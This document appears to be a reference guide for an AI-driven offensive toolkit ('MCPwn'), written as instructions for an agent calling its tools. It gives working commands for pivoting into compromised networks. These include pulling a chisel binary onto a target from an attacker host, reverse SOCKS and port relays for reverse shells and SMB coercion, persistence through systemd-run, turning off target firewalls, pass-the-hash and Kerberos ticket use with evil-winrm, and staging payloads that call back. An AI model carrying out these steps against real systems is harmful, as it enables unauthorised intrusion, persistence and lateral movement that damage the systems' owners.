# MCPwn Tunnels & Reverse Shells

Bring reachability up and verify it **before** enumerating — a missing route fakes an all-filtered scan. These are catalog tools: `get_tools(domain="network")`.

## `tunnel_up` — one front-end over VPN/expose/proxy/forward

Launches the backend detached (survives the call), parses the live endpoint, tracks it for teardown. Key param: `kind`.

- **`vpn`** — OpenVPN. Profile inline (`config`) or by reference (`config_ref` = container path / artifact SHA / `mcp://artifacts/<sha>`), plus `auth_user`/`auth_pass`. Returns `iface=tun0` + assigned IP. Config written base64-safe (no inline-transfer corruption).
- **`expose`** — publish a local port to a public URL (webhooks, file serving, exposing a listener). `backend` `pinggy` (default; `protocol` http/tcp/tls, optional `token`) or `bore` (`token`=secret).
- **`proxy`** — SOCKS pivot. `chisel` (reverse SOCKS from a compromised host) or `ssh` (`-D` dynamic SOCKS via a jump `server`, also writes a proxychains config). Route tools through `proxychains_run`.
- **`forward`** — point-to-point port forward over `ssh` (`-L`/`-R`) or `chisel`.

```python
run_tool("tunnel_up", {"kind":"vpn","config_ref":"mcp://artifacts/<sha>"})       # → iface=tun0, endpoint=<IP>
run_tool("tunnel_up", {"kind":"expose","backend":"bore","local_port":8000})       # → public host:port
run_tool("tunnel_up", {"kind":"proxy","backend":"chisel","server":"<pivot>:8000"})    # → socks5://127.0.0.1:1080
run_tool("tunnel_up", {"kind":"proxy","backend":"ssh","server":"user@jump"})          # → socks5://127.0.0.1:1080
run_tool("tunnel_list", {}); run_tool("tunnel_status", {"tunnel_id":"tnl-…"}); run_tool("tunnel_down", {"tunnel_id":"tnl-…"})
```

**Reverse-SOCKS chisel needs the client binary ON the compromised host.** On an ultra-minimal target (only `bash`/`curl`/`wget`, no python/nc/socat — common in app containers) don't hand-roll a forwarder: push the static `chisel` from the depot (`/opt/linux-payloads/chisel`, `list_payloads`/`get_payload`) with `upload_to_target(backend=http)` (or serve it yourself: `nohup python3 -m http.server` on the container + `curl -o /tmp/chisel http://<LHOST>:<port>/chisel` on the target), then `chisel server -p 8000 --reverse --socks5` (container) ↔ `/tmp/chisel client <LHOST>:8000 R:socks` (target) → SOCKS on `127.0.0.1:1080` → `proxychains_run`. The target can reach `<LHOST>` (that's how the callback got there); a *new* inbound to it usually can't.

**Chisel is the reliable MCPwn pivot.** Chisel has no interactive console — server and client are one-shot commands that connect and run, fully compatible with `start_interactive_shell` and `execute_command`. Use chisel for all SOCKS/forward pivots.

**Chisel multi-forward pattern (proven reliable):** serve files AND relay SMB/callbacks through the same tunnel:
```
# Container — run as managed interactive shell (persists):
start_interactive_shell(sid, "chisel server --port 8000 --reverse --socks5")

# Box — systemd-run for persistence across shell deaths:
sudo systemd-run --unit=pivot-chisel --collect /tmp/chisel client <LHOST>:8000 \
  R:socks 0.0.0.0:445:<LHOST>:445 0.0.0.0:4445:<LHOST>:4445 0.0.0.0:80:<LHOST>:8099
```
This gives: container SOCKS5 on 127.0.0.1:1080 into the internal net; box:445 → container Responder (coercion relay); box:4445 → container listener (reverse shells from internal hosts); box:80 → container HTTP server (payload delivery to internal hosts that can only reach the box).

**proxychains config** — `/etc/proxychains4.conf` is often read-only in the container; write a custom conf to `/tmp/pc.conf` and use `proxychains4 -q -f /tmp/pc.conf`:
```
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
```

**systemd-run persistence on the box:** when the compromised host runs systemd and you have root, launch persistent processes as transient systemd units — they survive shell deaths and service restarts (unlike `setsid`/`nohup` which die with the cgroup):
```
sudo systemd-run --unit=pivot-chisel --collect /tmp/chisel client ...
sudo systemctl set-property aegis.service TasksMax=infinity  # prevent cgroup PID exhaustion
```

**Post-reset checklist:** UFW and iptables re-enable after a box reset. Immediately:
```
sudo ufw disable
sudo iptables -F; sudo iptables -X; sudo iptables -P INPUT ACCEPT; sudo iptables -P FORWARD ACCEPT; sudo iptables -P OUTPUT ACCEPT
```

**fail2ban silently kills SSH pivots.** If your tunnels run over `ssh` to a pivot/entry host (`kind=proxy backend=ssh`, `-L`/`-D`, or `ProxyJump`), a few **failed** SSH auths (spraying creds, a wrong username, testing `svc-x`) ban the *source* IP — dropping every existing forward at once, so unrelated tools start timing out. Auth only with creds you've **already validated**; keep one long-lived SSH connection and reuse it; if new SSH to the host starts getting `Connection reset`/refused while old sessions worked, it's the ban — wait it out (default ~10 min), don't hammer.

## `tunnel_revshell` — reachable LHOST:LPORT + payloads

Returns a cross-OS-reachable `lhost`/`lport` and ready reverse-shell payloads. Params: `local_port`, `reach` (`auto`/`vpn`/`host`/`public`), `listener`.

Cross-OS reach logic:
- **Linux host** — the container shares host networking, so local listeners and the host VPN `tun0` are directly reachable.
- **Windows/macOS host** — the container is NAT'd. A VPN brought up **inside** the container (`tunnel_up kind=vpn`) gives it a routable `tun0`, so a callback to that IP works everywhere. With no VPN, `reach=public` publishes the port through a relay.
- `reach=auto` picks the right path.

Start the listener via `start_interactive_shell` using the emitted command.

## Out-of-band callback (no listener)

- `webhook_create({server})` — hosted webhook.site URL (zero setup).
- `webhook_requests({uuid, limit})` — read captured hits. Good for blind SSRF/RCE confirmation.

## Catching & driving a shell

- **Default to penelope, not raw nc.** `tunnel_revshell` emits a `penelope` listener by default — auto PTY upgrade, session management, and every session logged to `~/.penelope/sessions/` (authoritative transcript on disk). Use `listener="nc"` only for a throwaway one-shot. (`listener="pwncat"` still maps to penelope.)
- **penelope/pwncat are pty-only — always `start_interactive_shell`.** They need a controlling TTY (pexpect allocates one); without it they die on a termios traceback. Firing `penelope -p <port>` through `execute_command` no longer crashes or hangs: the executor **detects the pty-only listener** (seeing through `sudo`/`env` prefixes) and returns `{guard:"pty_only_listener", fallback_command:"nc -lvnp <port>", ...}` instead. Read that as *relaunch under `start_interactive_shell`* — or catch with the emitted raw `nc` and `stabilize_shell` after. It never silently runs penelope (crash) nor a blocking nc (hang-until-timeout) in the non-interactive path.
- After catching a raw shell: `stabilize_shell(interactive_id)` → target-side PTY (python→script fallback) + `TERM` fix. **Shell-aware:** it detects the remote shell first and applies the Linux upgrade only on a POSIX shell; on a Windows shell it returns `skipped=true` (a Linux `python pty` upgrade there is just error noise) and points you to the Windows path below.
- **Discrete commands: `run_in_shell(interactive_id, cmd)`** — marker-synced, returns THIS command's `output` + `exit_code` in one call (posix/powershell/cmd autodetected). Fixes fragmented reads and previous-command bleed (evil-winrm / Windows CLM).

## Windows / AD / Kerberos shells

A raw Windows callback (nc.exe, ConPtyShell, `RunasCs`) has no Unix PTY — do **not** `stabilize_shell` a POSIX way (it auto-skips). Drive it directly, or pivot to a proper channel.

- **Drive the raw callback:** `run_in_shell` autodetects `cmd` vs `powershell` and brackets each command with its own marker + `%errorlevel%`/`$LASTEXITCODE`, so you get clean scoped output even under Constrained Language Mode. Prefer it over `read_shell_output` loops.
- **Upgrade to a real TTY — pivot to evil-winrm** (needs WinRM/5985 and creds, an NTLM hash, or a Kerberos ticket): `get_tools(domain="network", query="winrm")` → the evil-winrm wrapper, or `execute_command("evil-winrm -i <dc> -u <user> -p <pass>")` as a `start_interactive_shell` (it wants a TTY). Pass-the-hash: `evil-winrm ... -H <nthash>`. It gives a clean PowerShell PTY, upload/download, and `Invoke-*` — steadier than babysitting nc.
- **Kerberos-first flow (name + realm must resolve, clock must match):**
  1. Resolve the DC FQDN **and** the REALM in `/etc/hosts` (impacket resolves the referral KDC by realm name): `printf '%s\n' '<ip> <dc.fqdn> <domain> <REALM>' | sudo tee -a /etc/hosts`.
  2. Kill clock skew (`KRB_AP_ERR_SKEW`): `get_tools(domain="network", query="kerberos time")` → `krb_time_probe` reads the DC time over SMB2 and emits a ready `faketime` wrapper; wrap the auth command with it, e.g. `faketime '<DC time>' impacket-getTGT <domain>/<user>:<pass>`.
  3. Get a TGT → ccache: `impacket-getTGT <domain>/<user>:<pass>` (or `-hashes :<nt>`), then `export KRB5CCNAME=<user>.ccache`.
  4. Use the ticket: `evil-winrm -i <dc.fqdn> -u <user> -r <REALM>` (Kerberos), or `netexec winrm <dc> -u <user> -k` / `netexec smb <dc> -u <user> -k`. Impacket scripts run as `impacket-<name>` or `<name>.py`; `kinit`/`klist` are present too.
- **Ship a payload to the Windows target** (ConPtyShell, RunasCs, a Potato): `list_payloads` → `get_payload` → `upload_to_target(backend=smb|scp|http, ...)` — the depot at `/opt/windows-payloads/` is pre-staged and PtH-aware. Then trigger it to call back to your `tunnel_revshell` LHOST:LPORT.
- **Pivot to reach an internal DC/host first** if 5985/445 aren't directly routable: `tunnel_up kind=proxy backend=chisel` (or `kind=proxy backend=ssh`) then run `evil-winrm`/`netexec`/impacket through `proxychains_run`. **For Kerberos SMB, use a SOCKS proxy to the DC's real FQDN — NOT an `ssh -L 445:dc:445` local forward.** A `-L` forward makes impacket connect to `127.0.0.1` while deriving the SPN from the DC name; the mismatch breaks SPNEGO on Server 2019+ (`STATUS_MORE_PROCESSING_REQUIRED` / mechListMIC — looks like the client "can't do cross-realm SMB", but it's the forward). Through SOCKS the client dials the real FQDN so SPN + connection align. If a golden/forged ticket **authenticates but every access is denied**, suspect clock skew (`faketime`) or the wrong read method before concluding the SID was filtered.

Quick shape:
```python
run_tool("tunnel_revshell", {"local_port":4444})                 # LHOST:LPORT + payloads
start_interactive_shell(session_id, "penelope -p 4444")           # catch (pty-backed)
# ... trigger Windows payload on target ...
run_in_shell(iid, "whoami /priv")                                 # cmd/powershell autodetected
# escalate to a clean channel once you have creds/hash/ticket:
start_interactive_shell(session_id, "evil-winrm -i dc.corp.htb -u svc -H <nthash>")
```

## Raw-channel survival (when you must use nc/socat)

A raw catcher has no remote pty: output fragments, prompts stay blank, the local pty line discipline eats control chars.
- **Output you need**: run `cmd > /tmp/o 2>&1; cat /tmp/o` — don't rely on the live stream.
- **Short output can still come back blank** even via `cat` (no remote pty → the local line discipline eats CR/short lines): a 34-byte flag `cat`s as empty. Read the *value* out-of-band — `base64 <file>` or `od -c <file>` — and decode locally. This is the reliable way to lift a flag/hash/key off a raw shell.
- **`su`/`sudo` password entry fails on a raw channel**: `su` reads `/dev/tty`, not stdin, so `echo pw | su user`, a heredoc, and `su … < pw.txt` all give `Authentication failure` or hang — the password never reaches it. Fixes, in order: (1) `stabilize_shell` first — a real target pty makes `su`/`sudo` prompt normally; (2) drive it turn-by-turn with `send_to_shell` — send `su user`, wait for `Password:`, `send_to_shell(id,"pw\n")`, then run commands in the elevated shell; (3) `sudo -S` is the one that *does* read stdin: `echo pw | sudo -S cmd`.
- **Background watchers**: `setsid cmd &` or `nohup cmd &` — a bare `&` dies when the channel hiccups or the shell is re-caught.
- **Never SIGINT the listener to stop a remote job**: `signal_interactive_shell(SIGINT)` sends 0x03 to the LOCAL pty → the line discipline kills `nc` and the shell drops; it never reaches the remote. Use the file-redirect pattern or a remote pty.
- **pty-in-pty caveat**: `python3 -c 'import pty;pty.spawn("/bin/bash")'` shifts the local relay's echo/prompt/ANSI handling; set `stty raw -echo` locally when driving a full-screen program.
- **Prefer a stable primary channel**: an SSH key, `evil-winrm`, or operator creds beat babysitting a raw nc catcher.
